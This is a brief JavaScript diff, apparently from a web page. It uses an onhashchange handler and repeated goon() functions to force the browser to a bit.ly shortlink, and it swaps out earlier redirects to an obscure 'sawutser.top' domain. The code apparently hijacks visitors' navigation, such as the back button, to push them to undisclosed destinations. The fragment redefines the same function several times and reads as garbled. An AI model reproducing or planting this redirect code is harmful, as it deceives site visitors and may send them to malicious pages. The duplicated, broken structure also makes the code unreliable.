@@ -7,11 +7,11 @@ window.onhashchange=function(){jp();};
         location.href="https://bit.ly/3W6qUJU";
     }
     function goon(){
-        location.href="https://sawutser.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
         location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
-        location.href="https://sawutser.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
